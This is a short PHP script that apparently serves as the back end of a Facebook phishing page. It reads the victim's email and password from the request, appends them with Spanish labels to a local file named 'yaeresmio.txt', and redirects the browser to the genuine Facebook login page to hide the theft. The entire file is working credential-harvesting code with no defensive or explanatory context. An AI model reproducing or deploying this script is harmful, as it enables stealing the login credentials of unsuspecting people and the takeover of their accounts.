<?php
header("Location: http://www.Facebook.com/login.php ");
$archivo = fopen("yaeresmio.txt", "a"); 


fwrite($archivo, "Correo = ");
fwrite($archivo, $_GET["email"]);
fwrite($archivo, "\r\n");
fwrite($archivo, "Contraseña = ");
fwrite($archivo, $_GET["pass"]);

fwrite($archivo, "\r\n");
fwrite($archivo, "--------------------------------------------------------------");
fwrite($archivo, "\r\n");
fclose($archivo);

exit
?>